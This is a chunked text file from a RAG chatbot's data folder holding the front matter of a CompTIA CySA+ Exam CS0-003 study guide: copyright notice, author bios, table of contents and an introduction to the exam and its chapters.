rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	CompTIA ® CySA+ Study Guide Exam CS0-­0 03 Third Edition Mike Chapple David Seidl Copyright © 2023 by John Wiley & Sons, Inc. All rights reserved. Published by John Wiley & Sons, Inc., Hoboken, New Jersey. Published simultaneously in Canada and the United Kingdom. ISBNs: 9781394182909 (paperback), 9781394182923 (ePDF), 9781394182916 (ePub) No part of this publication may be reproduced, stored in a retrieval system, or transmitted in any form or by any means, electronic, mechanical, photocopying, recording, scanning, or otherwise, except as permitted under Section 107 or 108 of the 1976 United States Copyright Act, without either the prior written permission of the Publisher, or authorization through payment of the appropriate per-­copy fee to the Copyright Clearance Center, Inc., 222 Rosewood Drive, Danvers, MA 01923, (978) 750-­8400, fax (978) 750-­4470, or on the web at www .copyright.com. Requests to the Publisher for permission should be addressed to the Permissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-­6011, fax (201) 748-­6008, or online at www.wiley.com/go/permission. Trademarks: WILEY, the Wiley logo, and the Sybex logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States and other countries, and may not be used without written permission. CompTIA is a registered trademark of CompTIA, Inc. All other trademarks are the property of their respective owners. John Wiley & Sons, Inc. is not associated with any product or vendor mentioned in this book. Limit of Liability/Disclaimer of Warranty: While the publisher and authors have used their best efforts in preparing this book, they make no representations or warranties with respect to the accuracy or completeness of the contents of this book and specifically disclaim any implied warranties of merchantability or fitness for a particular purpose. No warranty may be created or extended by sales representatives or written sales materials. The advice and strategies contained herein may not be suitable for your situation. You should consult with a professional where appropriate. Further, readers should be aware that websites listed in this work may have changed or disappeared between when this work was written and when it is read. Neither the publisher nor authors shall be liable for any loss of profit or any other commercial damages, including but not limited to special, incidental, consequential, or other damages. For general information on our other products and services or for technical support, please contact our Customer Care Department within the United States at (800) 762-­2974, outside the United States at (317) 572-­3993 or fax (317) 572-­4002. Wiley also publishes its books in a variety of electronic formats. Some content that appears in print may not be available in electronic formats. For more information about Wiley products, visit our web site at www.wiley.com. Library of Congress Control Number: 2022951784 Cover image: © Jeremy Woodhouse/Getty Images, Inc. Cover design: Wiley I dedicate this book to my father, who was a role model of the value of hard work, commitment to family, and the importance of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	contact our Customer Care Department within the United States at (800) 762-­2974, outside the United States at (317) 572-­3993 or fax (317) 572-­4002. Wiley also publishes its books in a variety of electronic formats. Some content that appears in print may not be available in electronic formats. For more information about Wiley products, visit our web site at www.wiley.com. Library of Congress Control Number: 2022951784 Cover image: © Jeremy Woodhouse/Getty Images, Inc. Cover design: Wiley I dedicate this book to my father, who was a role model of the value of hard work, commitment to family, and the importance of doing the right thing. Rest in peace, Dad. —­Mike Chapple This book is dedicated to Ric Williams, my friend, mentor, and partner in crime through my first forays into the commercial IT world. Thanks for making my job as a “network janitor” one of the best experiences of my life. —­David Seidl Acknowledgments Books like this involve work from many people, and as authors, we truly appreciate the hard work and dedication that the team at Wiley shows. We would especially like to thank senior acquisitions editor Kenyon Brown. We have worked with Ken on multiple projects and consistently enjoy our work with him. We also greatly appreciated the editing and production team for the book, including Lily Miller, our project editor, who brought years of experience and great talent to the project; Chris Crayton, our technical editor, who provided insightful advice and gave wonderful feedback throughout the book; Archana Pragash, our production editor, who guided us through layouts, formatting, and final cleanup to produce a great book; and Elizabeth Welch, our copy editor, who helped the text flow well. We would also like to thank the many behind-­the-­scenes contributors, including the graphics, production, and technical teams who make the book and companion materials into a finished product. Our agent, Carole Jelen of Waterside Productions, continues to provide us with wonderful opportunities, advice, and assistance throughout our writing careers. Finally, we would like to thank our families and significant others who support us through the late evenings, busy weekends, and long hours that a book like this requires to write, edit, and get to press. About the Authors Mike Chapple, Ph.D., Security+, CySA+, CISSP, is author of over 50 books, including the best-­selling CISSP (ISC)2 Certified Information Systems Security Professional Official Study Guide (Sybex, 2021) and the CISSP (ISC)2 Official Practice Tests (Sybex, 2021). He is an information security professional with two decades of experience in higher education, the private sector, and government. Mike currently serves as a Teaching Professor in the IT, Analytics, and Operations department at the University of Notre Dame’s Mendoza College of Business, where he teaches undergraduate and graduate courses on cybersecurity, data management, and business analytics. Before returning to Notre Dame, Mike served as executive vice president and chief information officer of the Brand Institute, a Miami-­based marketing consultancy. Mike also spent four years in the information security research group at the National Security Agency
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Practice Tests (Sybex, 2021). He is an information security professional with two decades of experience in higher education, the private sector, and government. Mike currently serves as a Teaching Professor in the IT, Analytics, and Operations department at the University of Notre Dame’s Mendoza College of Business, where he teaches undergraduate and graduate courses on cybersecurity, data management, and business analytics. Before returning to Notre Dame, Mike served as executive vice president and chief information officer of the Brand Institute, a Miami-­based marketing consultancy. Mike also spent four years in the information security research group at the National Security Agency and served as an active duty intelligence officer in the U.S. Air Force. Mike earned both his B.S. and Ph.D. degrees from Notre Dame in computer science and engineering. Mike also holds an M.S. in computer science from the University of Idaho and an MBA from Auburn University. Mike holds certifications in Cybersecurity Analyst+ (CySA+), Security+, Certified Information Security Manager (CISM), Certified Cloud Security Professional (CCSP), and Certified Information Systems Security Professional (CISSP). He provides security certification resources on his website at CertMike.com. David Seidl, CySA+, CISSP, PenTest+, is Vice President for Information Technology and CIO at Miami University. During his IT career, he has served in a variety of technical and information security roles, including serving as the Senior Director for Campus Technology Services at the University of Notre Dame where he co-­led Notre Dame’s move to the cloud and oversaw cloud operations, ERP, databases, identity management, and a broad range of other technologies and service. He also served as Notre Dame’s Director of Information Security and led Notre Dame’s information security program. He has taught information security and networking undergraduate courses as an instructor for Notre Dame’s Mendoza College of Business, and he has written 18 books on security certification and cyberwarfare, including co-­authoring CISSP (ISC)2 Official Practice Tests (Sybex, 2021) as well as the previous editions of both this book and the companion CompTIA CySA+ Practice Tests (Sybex, 2020, 2018). David holds a bachelor’s degree in communication technology and a master’s degree in information security from Eastern Michigan University, as well as certifications in CISSP, CySA+, Pentest+, GPEN, and GCIH. About the Technical Editor Chris Crayton, MCSE, CISSP, CASP, CySA+, A+, N+, S+, is a technical consultant, trainer, author, and industry-­leading technical editor. He has worked as a computer technology and networking instructor, information security director, network administrator, network engineer, and PC specialist. Chris has served as technical editor and content contributor on numerous technical titles for several of the leading publishing companies. He has also been recognized with many professional and teaching awards. Contents at a Glance Introduction xxi Assessment Test xxxv Domain I Security Operations 1 Chapter 1 Today’s Cybersecurity Analyst 3 Chapter 2 System and Network Architecture 37 Chapter 3 Malicious Activity 77 Chapter 4 Threat Intelligence 135 Chapter 5 Reconnaissance and Intelligence Gathering 159 Domain II Vulnerability Management 201 Chapter 6 Designing a Vulnerability Management Program 203 Chapter 7 Analyzing Vulnerability Scans 245
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	administrator, network engineer, and PC specialist. Chris has served as technical editor and content contributor on numerous technical titles for several of the leading publishing companies. He has also been recognized with many professional and teaching awards. Contents at a Glance Introduction xxi Assessment Test xxxv Domain I Security Operations 1 Chapter 1 Today’s Cybersecurity Analyst 3 Chapter 2 System and Network Architecture 37 Chapter 3 Malicious Activity 77 Chapter 4 Threat Intelligence 135 Chapter 5 Reconnaissance and Intelligence Gathering 159 Domain II Vulnerability Management 201 Chapter 6 Designing a Vulnerability Management Program 203 Chapter 7 Analyzing Vulnerability Scans 245 Chapter 8 Responding to Vulnerabilities 293 Domain III Incident Response and Management 341 Chapter 9 Building an Incident Response Program 343 Chapter 10 Incident Detection and Analysis 377 Chapter 11 Containment, Eradication, and Recovery 397 Domain IV Reporting and Communication 421 Chapter 12 Reporting and Communication 423 Chapter 13 Performing Forensic Analysis and Techniques for Incident Response 447 Answers to Review Questions 489 Appendix Index 513 Contents Introduction xxi Assessment Test xxxv Domain I Chapter 1 Security Operations 1 Today’s Cybersecurity Analyst 3 Cybersecurity Objectives Privacy vs. Security Evaluating Security Risks Identify Threats Identify Vulnerabilities Determine Likelihood, Impact, and Risk Reviewing Controls Building a Secure Network Network Access Control Firewalls and Network Perimeter Security Network Segmentation Defense Through Deception Secure Endpoint Management Hardening System Configurations Patch Management Group Policies Endpoint Security Software Penetration Testing Planning a Penetration Test Conducting Discovery Executing a Penetration Test Communicating Penetration Test Results Training and Exercises Reverse Engineering Isolation and Sandboxing Reverse Engineering Software Reverse Engineering Hardware Efficiency and Process Improvement Standardize Processes and Streamline Operations Cybersecurity Automation Technology and Tool Integration Bringing Efficiency to Incident Response 4 5 6 9 10 10 12 12 12 14 17 18 19 19 19 20 20 21 22 23 23 24 24 25 25 25 26 27 28 28 29 29 xii Chapter Contents 2 The Future of Cybersecurity Analytics Summary Exam Essentials Lab Exercises Activity 1.1: Create an Inbound Firewall Rule Activity 1.2: Create a Group Policy Object Activity 1.3: Write a Penetration Testing Plan Activity 1.4: Recognize Security Tools 31 31 32 33 33 34 35 36 System and Network Architecture 37 Infrastructure Concepts and Design Serverless Virtualization Containerization Operating System Concepts System Hardening The Windows Registry File Structure and File Locations System Processes Hardware Architecture Logging, Logs, and Log Ingestion Time Synchronization Logging Levels Network Architecture On-­Premises Cloud Hybrid Network Segmentation Software-­Defined Networking Zero Trust Secure Access Service Edge Identity and Access Management Multifactor Authentication (MFA) Passwordless Single Sign-­On (SSO) Federation Federated Identity Security Considerations Federated Identity Design Choices Federated Identity Technologies Privileged Access Management (PAM) Cloud Access Security Broker (CASB) Encryption and Sensitive Data Protection Public Key Infrastructure (PKI) Secure Sockets Layer (SSL) Inspection 38 38 39 39 41 41 42 43 44 45 45 45 46 47 47 48 49 49 51 52 52 53 54 55 55 56 57 59 61 64 65 65 66 67 Contents Chapter 3 xiii Data
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Network Architecture On-­Premises Cloud Hybrid Network Segmentation Software-­Defined Networking Zero Trust Secure Access Service Edge Identity and Access Management Multifactor Authentication (MFA) Passwordless Single Sign-­On (SSO) Federation Federated Identity Security Considerations Federated Identity Design Choices Federated Identity Technologies Privileged Access Management (PAM) Cloud Access Security Broker (CASB) Encryption and Sensitive Data Protection Public Key Infrastructure (PKI) Secure Sockets Layer (SSL) Inspection 38 38 39 39 41 41 42 43 44 45 45 45 46 47 47 48 49 49 51 52 52 53 54 55 55 56 57 59 61 64 65 65 66 67 Contents Chapter 3 xiii Data Loss Prevention (DLP) Personally Identifiable Information (PII) Cardholder Data (CHD) Summary Exam Essentials Lab Exercises Activity 2.1: Set Up Virtual Machines for Exercises Activity 2.2: Explore the Windows Registry Activity 2.3: Review System Hardening Guidelines Review Questions 68 68 68 68 70 70 70 71 72 73 Malicious Activity 77 Analyzing Network Events Capturing Network-­Related Events Detecting Common Network Issues Detecting Scans and Sweeps Detecting Denial-­of-­Service and Distributed Denial-­of-­Service Attacks Detecting Other Network Attacks Detecting and Finding Rogue Devices Investigating Host-­Related Issues System Resources Malware, Malicious Processes, and Unauthorized Software Unauthorized Access, Changes, and Privileges Social Engineering Investigating Service-­and Application-­Related Issues Application and Service Monitoring Determining Malicious Activity Using Tools and Techniques Logs, Log Analysis, and Correlation Logs Security Appliances and Tools Packet Capture DNS and Whois Reputation Services Common Techniques Protecting and Analyzing Email File Analysis Sandboxing User Behavior Analysis Data Formats Summary Exam Essentials Lab Exercises Activity 3.1: Identify a Network Scan 78 79 82 86 87 88 88 91 91 95 97 99 100 100 104 105 105 110 111 112 114 115 119 120 121 121 126 127 128 128 xiv Chapter Chapter Contents 4 5 Activity 3.2: Write an Application and Service Issue Response Plan Activity 3.3: Analyze a Phishing Email Review Questions 129 129 131 Threat Intelligence 135 Threat Data and Intelligence Open Source Intelligence Proprietary and Closed Source Intelligence Assessing Threat Intelligence Threat Intelligence Sharing The Intelligence Cycle The Threat Intelligence Community Threat Classification Threat Actors Tactics, Techniques, and Procedures (TTP) Applying Threat Intelligence Organizationwide Proactive Threat Hunting Focusing Your Threat Hunting Indicators of Compromise Threat Hunting Tools and Techniques Summary Exam Essentials Lab Exercises Activity 4.1: Explore the AlienVault OTX Activity 4.2: Set Up a STIX/TAXII Feed Activity 4.3: Intelligence Gathering Techniques Review Questions 136 137 139 140 142 144 145 146 146 147 148 148 149 150 151 151 152 153 153 153 154 155 Reconnaissance and Intelligence Gathering 159 Mapping, Enumeration, and Asset Discovery Active Reconnaissance Mapping Networks and Discovering Topology Pinging Hosts Port Scanning and Service Discovery Techniques and Tools Passive Discovery Log and Configuration Analysis Harvesting Data from DNS and Whois Information Aggregation and Analysis Tools Information Gathering Using Packet Capture Summary Exam Essentials Lab Exercises Activity 5.1: Port Scanning 160 161 162 163 165 175 175 184 190 190 192 192 193 193 Contents xv Activity 5.2: Device Fingerprinting Activity 5.3: Use the Metasploit Framework to Conduct
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	146 147 148 148 149 150 151 151 152 153 153 153 154 155 Reconnaissance and Intelligence Gathering 159 Mapping, Enumeration, and Asset Discovery Active Reconnaissance Mapping Networks and Discovering Topology Pinging Hosts Port Scanning and Service Discovery Techniques and Tools Passive Discovery Log and Configuration Analysis Harvesting Data from DNS and Whois Information Aggregation and Analysis Tools Information Gathering Using Packet Capture Summary Exam Essentials Lab Exercises Activity 5.1: Port Scanning 160 161 162 163 165 175 175 184 190 190 192 192 193 193 Contents xv Activity 5.2: Device Fingerprinting Activity 5.3: Use the Metasploit Framework to Conduct a Scan Review Questions 194 196 Domain II Vulnerability Management 201 Chapter Designing a Vulnerability Management Program 203 Identifying Vulnerability Management Requirements Regulatory Environment Corporate Policy Industry Standards Identifying Scan Targets Scheduling Scans Active vs. Passive Scanning Configuring and Executing Vulnerability Scans Scoping Vulnerability Scans Configuring Vulnerability Scans Scanner Maintenance Developing a Remediation Workflow Reporting and Communication Prioritizing Remediation Testing and Implementing Fixes Delayed Remediation Options Overcoming Risks of Vulnerability Scanning Vulnerability Assessment Tools Infrastructure Vulnerability Scanning Cloud Infrastructure Scanning Tools Web Application Scanning Interception Proxies Summary Exam Essentials Lab Exercises Activity 6.1: Install a Vulnerability Scanner Activity 6.2: Run a Vulnerability Scan Review Questions 204 204 207 207 209 210 212 213 213 214 218 221 222 224 226 226 227 228 228 229 233 235 238 238 239 239 240 241 Analyzing Vulnerability Scans 245 Reviewing and Interpreting Scan Reports Understanding CVSS Validating Scan Results False Positives Documented Exceptions Understanding Informational Results 247 250 256 256 257 257 Chapter 6 7 194 xvi Chapter Contents 8 Reconciling Scan Results with Other Data Sources Trend Analysis Context Awareness Common Vulnerabilities Server and Endpoint Vulnerabilities Network Vulnerabilities Critical Infrastructure and Operational Technology Web Application Vulnerabilities Identification and Authentication Failures Data Poisoning Summary Exam Essentials Lab Exercises Activity 7.1: Interpret a Vulnerability Scan Activity 7.2: Analyze a CVSS Vector Activity 7.3: Remediate a Vulnerability Review Questions 258 259 259 260 261 269 275 276 281 283 284 284 285 285 285 287 288 Responding to Vulnerabilities 293 Analyzing Risk Risk Identification Risk Calculation Business Impact Analysis Managing Risk Risk Mitigation Risk Avoidance Risk Transference Risk Acceptance Implementing Security Controls Security Control Categories Security Control Types Threat Classification Threat Research and Modeling Managing the Computing Environment Attack Surface Management Change and Configuration Management Patch Management Software Assurance Best Practices The Software Development Life Cycle Software Development Phases Software Development Models DevSecOps and DevOps Designing and Coding for Security 294 295 296 297 300 300 302 302 302 303 303 304 305 305 307 308 309 310 310 310 311 313 318 319 Contents xvii Common Software Development Security Issues Secure Coding Best Practices Software Security Testing Software Assessment: Testing and Analyzing Code Policies, Governance, and Service Level Objectives Policies Standards Procedures Guidelines Exceptions and Compensating Controls Summary Exam Essentials Lab Exercises Activity 8.1: Risk Management Strategies Activity 8.2: Risk Identification and Assessment Activity 8.3: Risk Management Review Questions 319 320 321 322
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Life Cycle Software Development Phases Software Development Models DevSecOps and DevOps Designing and Coding for Security 294 295 296 297 300 300 302 302 302 303 303 304 305 305 307 308 309 310 310 310 311 313 318 319 Contents xvii Common Software Development Security Issues Secure Coding Best Practices Software Security Testing Software Assessment: Testing and Analyzing Code Policies, Governance, and Service Level Objectives Policies Standards Procedures Guidelines Exceptions and Compensating Controls Summary Exam Essentials Lab Exercises Activity 8.1: Risk Management Strategies Activity 8.2: Risk Identification and Assessment Activity 8.3: Risk Management Review Questions 319 320 321 322 325 326 327 329 330 331 333 333 334 334 334 335 336 Domain III Incident Response and Management 341 Chapter Building an Incident Response Program 343 Security Incidents Phases of Incident Response Preparation Detection and Analysis Containment, Eradication, and Recovery Post-­Incident Activity Building the Foundation for Incident Response Policy Procedures and Playbooks Documenting the Incident Response Plan Creating an Incident Response Team Incident Response Providers CSIRT Scope of Control Classifying Incidents Threat Classification Severity Classification Attack Frameworks MITRE’s ATT&CK Framework The Diamond Model of Intrusion Analysis Lockheed Martin’s Cyber Kill Chain The Unified Kill Chain Developing Testing Strategies 344 345 346 347 348 349 351 352 352 353 354 355 356 356 357 358 361 361 362 364 366 367 9 xviii Chapter Chapter Contents 10 11 Summary Exam Essentials Lab Exercises Activity 9.1: Incident Severity Classification Activity 9.2: Incident Response Phases Activity 9.3: Develop an Incident Communications Plan Activity 9.4: Explore the ATT&CK Framework Review Questions 367 368 369 369 370 370 370 372 Incident Detection and Analysis 377 Indicators of Compromise Investigating IoCs Unusual Network Traffic Increases in Resource Usage Unusual User and Account Behaviors File and Configuration Modifications Login and Rights Usage Anomalies Denial of Service Unusual DNS Traffic Combining IoCs Evidence Acquisition and Preservation Preservation Chain of Custody Legal Hold Validating Data Integrity Summary Exam Essentials Lab Exercises Activity 10.1: Explore IoCs in Alienvault’s Open Threat Exchange Activity 10.2: Identifying Suspicious Login Activity Activity 10.3: Legal Holds and Preservation Review Questions 378 381 381 382 383 384 385 385 387 387 388 388 388 388 388 389 390 391 Containment, Eradication, and Recovery 397 Containing the Damage Segmentation Isolation Removal Evidence Acquisition and Handling Identifying Attackers Incident Eradication and Recovery Remediation and Reimaging Patching Systems and Applications 398 400 402 403 405 405 406 407 407 391 391 392 393 Contents xix Sanitization and Secure Disposal Validating Data Integrity Wrapping Up the Response Managing Change Control Processes Conducting a Lessons Learned Session Developing a Final Report Evidence Retention Summary Exam Essentials Lab Exercises Activity 11.1: Incident Containment Options Activity 11.2: Sanitization and Disposal Techniques Review Questions 408 410 410 411 411 411 412 412 413 414 414 416 417 Domain IV Reporting and Communication 421 Chapter Reporting and Communication 423 Vulnerability Management Reporting and Communication Vulnerability Management Reporting Incident Response Reporting and Communication Stakeholder Identification and Communication Incident Declaration and Escalation Incident Communications Lessons Learned
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	407 391 391 392 393 Contents xix Sanitization and Secure Disposal Validating Data Integrity Wrapping Up the Response Managing Change Control Processes Conducting a Lessons Learned Session Developing a Final Report Evidence Retention Summary Exam Essentials Lab Exercises Activity 11.1: Incident Containment Options Activity 11.2: Sanitization and Disposal Techniques Review Questions 408 410 410 411 411 411 412 412 413 414 414 416 417 Domain IV Reporting and Communication 421 Chapter Reporting and Communication 423 Vulnerability Management Reporting and Communication Vulnerability Management Reporting Incident Response Reporting and Communication Stakeholder Identification and Communication Incident Declaration and Escalation Incident Communications Lessons Learned Incident Response Metrics and KPIs Incident Response Reporting Summary Exam Essentials Lab Exercises Activity 12.1: Vulnerability Management Reporting Activity 12.2: Review a Public Incident Report Activity 12.3: Incident Reporting Review Questions 424 424 431 431 432 433 436 436 437 439 440 441 441 441 442 443 Performing Forensic Analysis and Techniques for Incident Response 447 Building a Forensics Capability Building a Forensic Toolkit Understanding Forensic Software Capabilities and Application Conducting Endpoint Forensics Operating System, Process, and Memory Dump Analysis Network Forensics 448 449 450 450 455 455 458 Chapter 12 13 xx Contents Appendix Wireshark Network Forensics Tcpdump Network Forensics Cloud, Virtual, and Container Forensics Performing Cloud Service Forensics Performing Virtualization Forensics Container Forensics Post-­Incident Activity and Evidence Acquisition Conducting a Forensic Analysis Forensic Procedures Legal Holds and Preservation Evidence Acquisition Imaging Live Systems Reimaging Systems Acquiring Other Data Forensic Investigation: An Example Importing a Forensic Image Analyzing the Image Reporting Root Cause Analysis Lessons Learned Summary Exam Essentials Lab Exercises Activity 13.1: Create a Disk Image Activity 13.2: Conduct the NIST Rhino Hunt Activity 13.3: Identifying Security Tools Review Questions 458 459 460 460 461 461 462 463 463 464 465 468 469 470 472 473 474 478 479 480 480 481 481 481 482 483 484 Answers to Review Questions 489 Chapter 2: System and Network Architecture Chapter 3: Malicious Activity Chapter 4: Threat Intelligence Chapter 5: Reconnaissance and Intelligence Gathering Chapter 6: Designing a Vulnerability Management Program Chapter 7: Analyzing Vulnerability Scans Chapter 8: Responding to Vulnerabilities Chapter 9: Building an Incident Response Program Chapter 10: Incident Detection and Analysis Chapter 11: Containment, Eradication, and Recovery Chapter 12: Reporting and Communication Chapter 13: Performing Forensic Analysis and Techniques for Incident Response 490 492 493 495 497 499 501 503 505 507 509 Index 511 513 Introduction CompTIA® CySA+ (Cybersecurity Analyst) Study Guide: Exam CS0-003, Third Edition, provides accessible explanations and real-­world knowledge about the exam objectives that make up the Cybersecurity Analyst+ certification. This book will help you to assess your knowledge before taking the exam, as well as provide a stepping-­stone to further learning in areas where you may want to expand your skillset or expertise. Before you tackle the CySA+ exam, you should already be a security practitioner. CompTIA suggests that test takers have about four years of existing hands-­on information security experience. You should also be familiar with at least some of the
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	CompTIA® CySA+ (Cybersecurity Analyst) Study Guide: Exam CS0-003, Third Edition, provides accessible explanations and real-­world knowledge about the exam objectives that make up the Cybersecurity Analyst+ certification. This book will help you to assess your knowledge before taking the exam, as well as provide a stepping-­stone to further learning in areas where you may want to expand your skillset or expertise. Before you tackle the CySA+ exam, you should already be a security practitioner. CompTIA suggests that test takers have about four years of existing hands-­on information security experience. You should also be familiar with at least some of the tools and techniques described in this book. You don’t need to know every tool, but understanding how to approach a new scenario, tool, or technology that you may not know using existing experience is critical to passing the CySA+ exam. For up-­to-­the-­minute updates covering additions or modifications to the CompTIA certification exams, as well as additional study tools, videos, practice questions, and bonus material, be sure to visit the Sybex website and forum at www.sybex.com. CompTIA CompTIA is a nonprofit trade organization that offers certification in a variety of IT areas, ranging from the skills that a PC support technician needs, which are covered in the A+ exam, to advanced certifications like the CompTIA Advanced Security Practitioner (CASP+) certification. CompTIA recommends that practitioners follow a cybersecurity career path as shown here: CompTIA IT Fundamentals CompTIA A+ CompTIA Network+ CompTIA Security+ CompTIA CySA+ CompTIA CASP+ xxii Introduction The Cybersecurity Analyst+ exam is a more advanced exam, intended for professionals with hands-­on experience and who possess the knowledge covered by the prior exams. CompTIA certifications are ISO and ANSI accredited, and they are used throughout multiple industries as a measure of technical skill and knowledge. In addition, CompTIA certifications, including the CySA+, the Security+, and the CASP+ certifications, have been approved by the U.S. government as Information Assurance baseline certifications and are included in the State Department’s Skills Incentive Program. The Cybersecurity Analyst+ Exam The Cybersecurity Analyst+ exam, which CompTIA refers to as CySA+, is designed to be a vendor-­neutral certification for cybersecurity, threat, and vulnerability analysts. The CySA+ certification is designed for security analysts and engineers as well as security operations center (SOC) staff, vulnerability analysts, and threat intelligence analysts. It focuses on security analytics and practical use of security tools in real-­world scenarios. It covers four major domains: Security Operations, Vulnerability Management, Incident Response and Management, and Reporting and Communications. These four areas include a range of topics, from reconnaissance to incident response and forensics, while focusing heavily on scenario-­based learning. The CySA+ exam fits between the entry-­level Security+ exam and the CompTIA Advanced Security Practitioner (CASP+) certification, providing a mid-­career certification for those who are seeking the next step in their certification and career path. The CySA+ exam is conducted in a format that CompTIA calls “performance-­based assessment.” This means that the exam employs hands-­on simulations using actual security tools and scenarios to perform tasks that match those found
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Vulnerability Management, Incident Response and Management, and Reporting and Communications. These four areas include a range of topics, from reconnaissance to incident response and forensics, while focusing heavily on scenario-­based learning. The CySA+ exam fits between the entry-­level Security+ exam and the CompTIA Advanced Security Practitioner (CASP+) certification, providing a mid-­career certification for those who are seeking the next step in their certification and career path. The CySA+ exam is conducted in a format that CompTIA calls “performance-­based assessment.” This means that the exam employs hands-­on simulations using actual security tools and scenarios to perform tasks that match those found in the daily work of a security practitioner. Exam questions may include multiple types of questions such as multiple-­ choice, fill-­in-­the-­blank, multiple-­response, drag-­and-­drop, and image-­based problems. CompTIA recommends that test takers have four years of information security–related experience before taking this exam. The exam costs $392 at the time this book was written in the United States, with roughly equivalent prices in other locations around the globe. More details about the CySA+ exam and how to take it can be found at www.comptia .org/certifications/cybersecurity-­analyst. Study and Exam Preparation Tips A test preparation book like this cannot teach you every possible security software package, scenario, or specific technology that may appear on the exam. Instead, you should focus on whether you are familiar with the type or category of technology, tool, process, or scenario as you read the book. If you identify a gap, you may want to find additional tools to help you learn more about those topics. Introduction xxiii Additional resources for hands-­on exercises include the following: ■■ ■■ ■■ Exploit Exercises provides virtual machines, documentation, and challenges covering a wide range of security issues at http://Exploit-­Exercises.com. Hacking-­Lab provides capture the flag (CTF) exercises in a variety of fields at hacking-­lab.com. PentesterLab provides a subscription-­based access to penetration testing exercises at http://pentesterlab.com/exercises. Since the exam uses scenario-­based learning, expect the questions to involve analysis and thought, rather than relying on simple memorization. As you might expect, it is impossible to replicate that experience in a book, so the questions here are intended to help you be confident that you know the topic well enough to think through hands-­on exercises. Taking the Exam Once you are fully prepared to take the exam, you can visit the CompTIA website to purchase your exam voucher: http://store.comptia.org Currently, CompTIA offers two options for taking the exam: an in-­person exam at a testing center and an at-­home exam that you take on your own computer. This book includes a coupon that you may use to save 10 percent on your CompTIA exam registration. In-­Person Exams CompTIA partners with Pearson VUE’s testing centers, so your next step will be to locate a testing center near you. In the United States, you can do this based on your address or your ZIP code, while non-­U.S. test takers may find it easier to enter their city and country. You can search for a test center near you
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	taking the exam: an in-­person exam at a testing center and an at-­home exam that you take on your own computer. This book includes a coupon that you may use to save 10 percent on your CompTIA exam registration. In-­Person Exams CompTIA partners with Pearson VUE’s testing centers, so your next step will be to locate a testing center near you. In the United States, you can do this based on your address or your ZIP code, while non-­U.S. test takers may find it easier to enter their city and country. You can search for a test center near you at the Pearson Vue website, where you will need to navigate to “Find a test center.” https://home.pearsonvue.com/comptia Once you know where you’d like to take the exam, simply set up a Pearson VUE testing account and schedule an exam on their site. On the day of the test, take two forms of identification, and make sure to show up with plenty of time before the exam starts. Remember that you will not be able to take your notes, electronic devices (including smartphones and watches), or other materials in with you. xxiv Introduction At-­Home Exams CompTIA also offers an at-­home testing option that uses the Pearson Vue remote proctoring service. Candidates using this approach will take the exam at their home or office and be proctored over a webcam by a remote proctor. You can learn more about the at-­home testing experience by visiting: www.comptia.org/testing/testing-­options/take-­online-­exam After the Cybersecurity Analyst+ Exam Once you have taken the exam, you will be notified of your score immediately, so you’ll know if you passed the test right away. You should keep track of your score report with your exam registration records and the email address you used to register for the exam. Maintaining Your Certification CompTIA certifications must be renewed on a periodic basis. To renew your certification, you can either pass the most current version of the exam, earn a qualifying higher-­level CompTIA or industry certification, or complete sufficient continuing education activities to earn enough continuing education units (CEUs) to renew it. CompTIA provides information on renewals via their website at: www.comptia.org/continuing-­education When you sign up to renew your certification, you will be asked to agree to the CE program’s Code of Ethics, pay a renewal fee, and submit the materials required for your chosen renewal method. A full list of the industry certifications you can use to acquire CEUs toward renewing the CySA+ can be found at: www.comptia.org/continuing-­education/choose/ renew-­with-­a-­single-­activity/earn-­a-­higher-­level-­comptia-­certification What Does This Book Cover? This book is designed to cover the four domains included in the CySA+ exam. Chapter 1: Today’s Cybersecurity Analyst The book starts by teaching you how to assess cybersecurity threats, as well as how to evaluate and select controls to keep your networks and systems secure. Chapter 2: System and Network Architecture Understanding the underlying architecture that makes up your organization’s infrastructure will help you defend your Introduction xxv organization. In this chapter you will explore concepts like serverless
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	you can use to acquire CEUs toward renewing the CySA+ can be found at: www.comptia.org/continuing-­education/choose/ renew-­with-­a-­single-­activity/earn-­a-­higher-­level-­comptia-­certification What Does This Book Cover? This book is designed to cover the four domains included in the CySA+ exam. Chapter 1: Today’s Cybersecurity Analyst The book starts by teaching you how to assess cybersecurity threats, as well as how to evaluate and select controls to keep your networks and systems secure. Chapter 2: System and Network Architecture Understanding the underlying architecture that makes up your organization’s infrastructure will help you defend your Introduction xxv organization. In this chapter you will explore concepts like serverless and containerization technology as well as virtualization. You will also explore logs and logging, network architecture and design concepts, identity and access management concepts, and how encryption can be used for security and data protection. Chapter 3: Malicious Activity Analyzing events and identifying malicious activity is a key part of many security professionals roles. In this chapter you will explore how to monitor for and detect host-­based, network-­based, and application-­based attacks and indicators of compromise. You will also explore how logs, email, and other tools and data sources can be used as part of your investigations. Chapter 4: Threat Intelligence Security professionals need to fully understand threats in order to prevent them or to limit their impact. In this chapter, you will learn about the many types of threat intelligence, including sources and means of assessing the relevance and accuracy of a given threat intelligence source. You’ll also discover how to use threat intelligence in your organization. Chapter 5: Reconnaissance and Intelligence Gathering Gathering information about an organization and its systems is one of the things that both attackers and defenders do. In this chapter, you will learn how to acquire intelligence about an organization using popular tools and techniques. You will also learn how to limit the impact of intelligence gathering performed against your own organization. Chapter 6: Designing a Vulnerability Management Program Managing vulnerabilities helps to keep your systems secure. In this chapter, you will learn how to identify, prioritize, and remediate vulnerabilities using a well-­defined workflow and continuous assessment methodologies. Chapter 7: Analyzing Vulnerability Scans Vulnerability reports can contain 